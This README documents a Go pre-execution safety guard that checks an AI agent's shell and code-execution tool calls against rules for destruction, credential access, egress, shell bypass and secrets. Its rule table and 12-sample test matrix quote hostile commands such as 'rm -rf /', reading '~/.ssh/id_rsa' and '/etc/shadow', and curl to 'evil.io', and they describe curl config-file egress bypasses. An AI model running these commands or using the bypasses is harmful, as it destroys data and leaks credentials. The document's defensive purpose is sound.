# Tool Execution Safety Guard

`tool/safety` is a file-driven, **pre-execution** safety policy for exec-style
tools (`workspace_exec`, hostexec `exec_command`, codeexec `execute_code`). It
plugs in as a `tool.PermissionPolicy` and returns an **allow / deny /
needs_human_review** decision for every exec tool call, emitting a structured
report, a JSONL audit event and OpenTelemetry span attributes.

> **It is not a sandbox.** The guard performs static / structural checks before
> a command runs and cannot see runtime behavior. It is one layer of
> defense-in-depth that complements — never replaces — the runtime isolation in
> `codeexecutor/container` and `codeexecutor/e2b`. See
> [Trust boundary & known limitations](#trust-boundary--known-limitations).

## Architecture & data flow

```text
model tool call (Arguments JSON + ToolName)
      │
      ▼
agent.WithToolPermissionPolicy(guard)          ← only integration point, pre-exec
      │
      ▼
Guard.CheckToolPermission
      ├─ 1. backendOf(toolName)  → "" ⇒ allow (non-exec tools short-circuit)
      ├─ 2. extract Arguments → ExecRequest{Command, Cwd, Env, Background, PTY, TimeoutSec}
      ├─ 3. shellsafe.Parse (unparsable ⇒ fail closed via unparsable_action)
      ├─ 4. rule engine → []Finding
      ├─ 5. aggregate highest risk → Decision
      ├─ 6. redact secrets → write report + audit.jsonl
      └─ 7. OpenTelemetry span attributes
      ▼
tool.PermissionDecision{Allow | Deny | Ask}
```

The guard never modifies `workspaceexec` / `hostexec` / `codeexec`. Their own
`WithAllowedCommands` / `WithDeniedCommands` options remain a complementary
second gate.

## Risk categories → rule ids

| # | Category | Rule id | What it catches | Risk |
|---|----------|---------|-----------------|------|
| 1 | dangerous_command | `R-DEL-001` | denied destructive commands; recursive `rm` (all flag spellings) with force **or aimed at a root/system path even without force** (`rm -r /etc`); recursive `chmod -R` → review. System paths include the Windows drive roots, `C:\Windows`, `C:\Program Files`, `C:\ProgramData` | medium → critical |
| 2 | credential_access | `R-CRED-001` | argv/cwd hitting `~/.ssh`, `**/.env`, `**/id_rsa`, credentials; `file:` URIs are decoded to their filesystem path first so `curl file:///etc/shadow` (any RFC 8089 spelling, incl. percent-encoded) cannot hide the path inside a URI | critical |
| 3 | network | `R-NET-001` | download commands targeting a non-whitelisted host, including curl egress-redirect options (`--connect-to`, `--resolve`, `-x/--proxy`, `--url`, `--dns-servers`, `--doh-url`) parsed for their real target across `flag value`, `flag=value` and bundled/inline short-flag (`-sx`, `-xhost`) forms. `--resolve` uses an option-specific `[+]host:port:addr[,addr]` parser so an **unbracketed IPv6** rewrite target (`--resolve github.com:443:2001:db8::1`) is extracted whole instead of being shattered on its colons. Fails closed on the opaque `-K/--config` file (incl. `-sK`); optionally fails closed on curl's **implicit default config** (see below). The non-curl download commands get the same treatment: host-bearing options (`ssh/scp -J` jump hosts, `ssh -W/-L/-R` forwarding specs, `nc -x` proxy) are parsed for their real targets across space/inline/bundled forms, and opaque egress controls (`wget -e/--execute/--config/-i/--input-file`, `ssh/scp -o/-F`, `scp/sftp -S`) **fail closed** because their config file / rc directive / URL list / transport program can redirect egress invisibly. Raw and bracketed IPv6 operands (`nc 2001:db8::1`, `[2001:db8::1]:443`, `user@[2001:db8::1]:`) are parsed as whole addresses instead of being truncated at the first colon. A download command with **no extractable target at all** falls back to review instead of silently allowing. URLs embedded in non-shell `execute_code` source are checked against the same whitelist | medium → high |
| 4 | shell_bypass | `R-SHELL-001` | unparsable commands (`$()`, backticks, `$VAR`, redirection, subshell) and shell wrappers / re-executing builtins (`bash -c`, `eval`, `xargs`, `env CMD`) that can bypass the allow/deny list; non-shell `execute_code` source that bridges into shell execution (`os.system`, `subprocess.`, `exec(`, `child_process`) → review | medium → high |
| 4b | command_policy | `R-CMD-001` | a plain, parseable command that is simply **not in `commands.allowed`** (an allow-list miss, not a bypass); with the opt-in `commands.review_pipelines` knob, any multi-segment pipeline / chain → review | medium → high |
| 5 | host_risk | `R-HOST-001` | background / PTY sessions and `sudo`/`su`/`nohup` on the host backend — **and on the workspace backend unless the policy declares `workspace_isolated: true`**, because workspace_exec can be backed by `codeexecutor/local`, which runs directly on the host | high → critical |
| 6 | dependency | `R-DEP-001` | configured installer subcommands (`pip install`, `go install`, ...) | medium |
| 7 | resource_abuse | `R-RES-001` | over-budget timeout, long `sleep`, `yes`, infinite-loop patterns, `head -c` beyond `max_output_bytes`, explicit high/unlimited concurrency (`xargs -P`, `parallel -j`), interpreter string-multiplication output (`print("x" * 10000000)`) | medium → high |
| 8 | secret_leak | `R-SECRET-001` | secret-like values in the command or env — provider token shapes (AWS, GitHub, `sk-`, Slack `xox`), private-key material, bearer headers, plus a name-based `password=`/`api_key=`/`token=` key=value heuristic; the env key participates in the match (also sets `redacted`) | medium |
| 9 | env_policy | `R-ENV-001` | environment keys not in `env.allowed_keys` (opt-in; inert when the list is empty) | medium |
| 10 | tool_metadata | `R-META-001` | a tool whose published metadata (`tool.ToolMetadata.Destructive`) declares irreversible side effects → review | medium |

Decision aggregation: the strongest action across findings wins
(`critical`/`high` → deny, `medium` → ask); with no actionable finding the
policy `default_action` applies. `rule_overrides` can relax or tighten any rule.

## Policy file (change config, not code)

The policy is YAML or JSON (`LoadPolicy` picks by extension). Editing it changes
the allow/deny lists, forbidden paths, network whitelist, limits and the
tool→backend mapping **without recompiling**.
[`testdata/tool_safety_policy.yaml`](testdata/tool_safety_policy.yaml) is the
**canonical, fully annotated reference** (every field, with rationale), kept
honest by the package tests — start from it. The trimmed policy under
[`examples/tool_safety_guard`](../../examples/tool_safety_guard) is a demo
subset, not the reference. Key fields:

- `unparsable_action` (default `deny`) — verdict when shellsafe cannot parse a
  command. **Fail closed.**
- `default_action` (default `allow`) — fallback when no rule fires.
- `backends` — tool name → backend identifier. Defaults cover the real tool
  names; **override here if a host/code tool was renamed via `WithName`**, since
  an unmapped tool is allowed without scanning.
- `workspace_isolated` (default `false`) — declares that the workspace backend
  really runs inside a sandbox (container/e2b). The guard cannot see the
  executor behind `workspace_exec`, and `codeexecutor/local` runs commands
  directly on the host, so the host-risk rule (`R-HOST-001`) applies to the
  workspace backend too until this is explicitly set. **Fail closed:** only set
  it to `true` when the deployment genuinely isolates workspace execution.
- `commands.allowed` / `commands.denied` — handed to `internal/shellsafe`;
  `commands.review_pipelines` (opt-in) routes any multi-segment pipeline to
  review.
- `denied_subcommands`, `forbidden_paths`, `network.*`, `resources.*`,
  `env.*`, `secrets.patterns`, `rule_overrides`.

`max_output_bytes` is a **static heuristic only**: it is checked where the
requested size is explicit in the command (`head -c N`). The guard does **not**
pass this value to workspaceexec / hostexec / the sandbox — an arbitrary
command can still emit more than it. If you need a hard output cap, configure
the executor's own limit separately (e.g. the sandbox's resource limits);
keeping the two values in sync is the operator's job. `env.allowed_keys` *is*
enforced statically as a soft check (`R-ENV-001` flags non-whitelisted keys);
the guard cannot strip a key, so real env isolation is still the runtime's
job.

## workspace vs host security boundary

| Dimension | `workspace_exec` | host `exec_command` |
|-----------|------------------|---------------------|
| Isolation | **depends on the executor**: a container/e2b workspace is sandboxed, `codeexecutor/local` is the host. The guard treats it as host-like until `workspace_isolated: true` is declared | direct host shell |
| PTY long session | `R-HOST-001` unless `workspace_isolated` | `R-HOST-001` → deny by default |
| Background process | `deny_background_on_host` applies unless `workspace_isolated`; a real sandbox reclaims the process with the session | residual-process risk → `deny_background_on_host` |
| Privilege | usually none | `sudo`/`su` → critical |
| Output / timeout | `max_timeout_sec` / explicit `head -c` flagged statically; a hard output cap must be configured on the executor itself (the guard does not wire `max_output_bytes` through) | same + process cleanup |
| Env exposure | non-whitelisted keys flagged (`R-ENV-001`); actual isolation by the runtime | same, but a larger host blast radius |

hostexec is a **ToolSet** (`exec_command` + `write_stdin` + `kill_session` +
session listing). The guard intercepts at the **session-establishment point**
(`exec_command`, including `pty:true`). In-session `write_stdin` carries only a
`session_id` and characters, so the guard is effectively blind to it — that risk
is covered by the sandbox and the audit trail, not by full per-keystroke
inspection.

## Usage

```go
guard, err := safety.NewGuard(
    safety.WithPolicyFile("tool_safety_policy.yaml"),
    safety.WithAuditFile("tool_safety_audit.jsonl"),
)
if err != nil { /* ... */ }
defer guard.Close()

events, err := runner.Run(ctx, userID, sessionID, msg,
    agent.WithToolPermissionPolicy(guard))
```

A runnable, offline demo lives in
[`examples/tool_safety_guard`](../../examples/tool_safety_guard).

## Telemetry

When a recording span is on the context (the framework's execute-tool span),
the guard sets:

- `tool.safety.decision`
- `tool.safety.risk_level`
- `tool.safety.rule_id` (string slice)
- `tool.safety.backend`
- `tool.safety.blocked`

Without a tracer this is a cheap no-op.

## Trust boundary & known limitations

**Why this cannot replace a sandbox.** The guard is a static, pre-execution
filter. It cannot observe what a command actually does at runtime: a script that
downloads then executes, dynamic string building inside a Python/JS interpreter,
or TOCTOU between the check and the run. Sandboxes
(`codeexecutor/container`, `codeexecutor/e2b`) provide runtime isolation and
resource limits (cgroups, namespaces). The two are complementary layers:

| Mechanism | Role |
|-----------|------|
| **Tool Safety Guard** (this) | pre-execution policy + structured audit; blocks obviously dangerous calls and records every decision |
| **shellsafe** | conservative shell parser; the trust anchor for the shell layer |
| **PermissionPolicy / Filter** | the framework hook this guard plugs into; controls visibility / auto-exec / permission |
| **CodeExecutor / sandbox** | runtime isolation that contains whatever slips past the guard |
| **Telemetry** | observability of decisions across the fleet |

Explicit limitations:

- **shellsafe is the trust anchor for shell parsing.** It is *fail-closed*:
  anything it cannot tokenize is rejected (→ deny/ask). The residual risk is a
  command it *accepts* but incorrectly tokenizes; that direction is pinned by the
  differential anchor tests in `shellsafe_anchor_test.go`.
- **`code` backend (`execute_code`) protection is narrower than shell.**
  Shell-language blocks (`bash`/`sh`/`zsh`/unlabeled) get the **full** rule set
  (they are parsed and scanned like commands; unparsable blocks fail closed).
  Non-shell blocks get the secret/resource rules, a URL whitelist pass over the
  source and a shell-bridge check (`os.system`, `subprocess.`, `exec(`,
  `child_process` → review) — but dynamically built strings, obfuscated imports
  and everything else an interpreter can do still bypass static analysis and
  rely on the sandbox. Do not assume code execution gets the same protection as
  shell commands.
- **Resource-abuse rules are best-effort.** String heuristics (`while true`,
  `yes`, `sleep N`) are easily evaded, and `max_output_bytes` only catches an
  explicitly requested size (`head -c N`). The guard does not configure the
  runtime: the real timeout / output enforcement is the executor's own limits
  (workspaceexec, the sandbox), which must be set up separately.
- **hostexec PTY long sessions** are intercepted only at the establishment
  point; in-session input is not inspected.
- **curl's implicit default config is invisible to the guard.** Beyond the
  explicit `-K/--config` file (always failed closed), curl also reads an implicit
  default config (`~/.curlrc`, `$CURL_HOME/.curlrc`, `$XDG_CONFIG_HOME/curlrc`;
  `_curlrc` on Windows) that can inject `url`/`proxy`/`resolve` egress unless
  `-q`/`--disable` is curl's **first** option. A clean-looking `curl https://<allowed>`
  can therefore be redirected by a planted config file. Because denying every
  curl without `-q` would break legitimate whitelisted downloads (and the
  `≤10%` false-positive budget), this is an **opt-in** control:
  `network.curl_require_disabled_config` (default `false`). Set it to `true` to
  fail such invocations closed via `on_non_whitelisted`. The env-scrub in
  workspaceexec (`CleanEnv`) drops a caller-supplied `HOME` but does not clear
  `CURL_HOME`/`XDG_CONFIG_HOME` or the inherited home, so it does not by itself
  neutralize this vector — the runtime sandbox remains the real containment.
- **The 12 shipped samples are a smoke matrix.** The acceptance metrics
  (≥90% detection, ≤10% false positive) are statistical; with 12 cases they are
  coarse. The hard guarantee is the 100% deny on the three critical categories
  (credential read, dangerous delete, non-whitelisted network). The sample
  harness is table-driven over `testdata/samples/`, so the corpus can grow.

## Validation results

Measured on the shipped policy and the 12-sample matrix
(`go test ./tool/safety/ -run TestSampleMatrix -v`, `-bench BenchmarkScan`):

| Metric | Result | Acceptance target |
|--------|--------|-------------------|
| High-risk detection | **100%** (9/9) | ≥ 90% |
| Safe false-positive | **0%** (0/3 safe) | ≤ 10% |
| Critical-class detection (credential read / dangerous delete / non-whitelisted network) | **100%** (3/3) | 100% |
| Per-scan latency | **~3.9 µs** (`3912 ns/op`, 20 allocs, 971 B/op) | — |
| 500-command total | **~1.5 ms** | ≤ 1 s |

> The detection / false-positive percentages are **statistically coarse** at 12
> samples (3 safe + 9 high-risk); the table-driven harness over
> `testdata/samples/` is built to grow. The hard guarantee is the 100% deny on
> the three critical categories, asserted directly in `TestSampleMatrix`.

### 12-sample matrix

| # | Sample | Tool | Class | Expected decision | Rule |
|---|--------|------|-------|-------------------|------|
| 01 | safe `go test ./...` | workspace_exec | safe | allow | — |
| 02 | dangerous delete `rm -rf /` | workspace_exec | high_risk | deny | R-DEL-001 |
| 03 | read ssh key `cat ~/.ssh/id_rsa` | workspace_exec | high_risk | deny | R-CRED-001 |
| 04 | non-whitelisted `curl http://evil.io/x.sh` | workspace_exec | high_risk | deny | R-NET-001 |
| 05 | whitelisted `curl https://github.com/org/repo` | workspace_exec | safe | allow | — |
| 06 | shell wrapper `bash -c "curl http://evil.io"` | workspace_exec | high_risk | deny | R-SHELL-001 |
| 07 | legit pipe `cat a.txt \| grep pattern` | workspace_exec | safe | allow | — |
| 08 | dependency install `pip install requests` | workspace_exec | high_risk | needs_human_review | R-DEP-001 |
| 09 | long sleep `sleep 600` | workspace_exec | high_risk | needs_human_review | R-RES-001 |
| 10 | unbounded output `yes` | workspace_exec | high_risk | deny | R-RES-001 |
| 11 | host background + PTY `sleep 5` (bg, tty) | exec_command | high_risk | deny | R-HOST-001 |
| 12 | secret in command (`Bearer <token>`) | workspace_exec | high_risk | needs_human_review | R-SECRET-001 |

### Example structured report (`tool_safety_report.json`)

A dangerous delete blocked before execution. Two independent gates fire — the
allow-list miss (`R-CMD-001`) and the destructive-pattern rule (`R-DEL-001`) —
which is defense-in-depth, not duplication:

```json
{
  "tool_name": "workspace_exec",
  "backend": "workspace_exec",
  "command": "rm -rf /",
  "decision": "deny",
  "risk_level": "critical",
  "blocked": true,
  "rule_ids": ["R-CMD-001", "R-DEL-001"],
  "findings": [
    {
      "rule_id": "R-CMD-001",
      "category": "command_policy",
      "risk_level": "high",
      "evidence": "command \"rm\" is not in allowed_commands",
      "recommendation": "Command is not in commands.allowed; add it to the allow list if it is expected, or keep it blocked."
    },
    {
      "rule_id": "R-DEL-001",
      "category": "dangerous_command",
      "risk_level": "critical",
      "evidence": "rm -rf /",
      "recommendation": "Avoid destructive commands; scope deletions to the workspace and never target system paths."
    }
  ],
  "redacted": false,
  "duration_us": 250,
  "timestamp": "2026-06-30T00:00:00Z"
}
```

### Example audit log (`tool_safety_audit.jsonl`)

One compact JSONL line per scanned call — what a monitoring pipeline consumes:

```jsonl
{"tool_name":"workspace_exec","decision":"allow","risk_level":"none","backend":"workspace_exec","rule_ids":[],"blocked":false,"redacted":false,"duration_us":250,"timestamp":"2026-06-30T00:00:00Z"}
{"tool_name":"workspace_exec","decision":"deny","risk_level":"critical","backend":"workspace_exec","rule_ids":["R-CMD-001","R-DEL-001"],"blocked":true,"redacted":false,"duration_us":250,"timestamp":"2026-06-30T00:00:00Z"}
{"tool_name":"workspace_exec","decision":"deny","risk_level":"critical","backend":"workspace_exec","rule_ids":["R-CRED-001"],"blocked":true,"redacted":false,"duration_us":250,"timestamp":"2026-06-30T00:00:00Z"}
{"tool_name":"exec_command","decision":"deny","risk_level":"high","backend":"host","rule_ids":["R-HOST-001"],"blocked":true,"redacted":false,"duration_us":250,"timestamp":"2026-06-30T00:00:00Z"}
{"tool_name":"workspace_exec","decision":"needs_human_review","risk_level":"medium","backend":"workspace_exec","rule_ids":["R-SECRET-001"],"blocked":true,"redacted":true,"duration_us":250,"timestamp":"2026-06-30T00:00:00Z"}
```

Each event carries tool name, decision, risk level, rule ids, backend, latency
(`duration_us`), whether output was redacted, and whether execution was blocked.

## Tests

```bash
go test ./tool/safety/...                       # full suite
go test ./tool/safety/ -run TestSampleMatrix -v # 12-sample detection metrics
go test ./tool/safety/ -bench BenchmarkScan     # per-scan latency (~µs)
go test ./tool/safety/ -run TestGenerate -update # regenerate example outputs
```

Deliverable examples: [`testdata/tool_safety_report.json`](testdata/tool_safety_report.json),
[`testdata/tool_safety_audit.jsonl`](testdata/tool_safety_audit.jsonl).
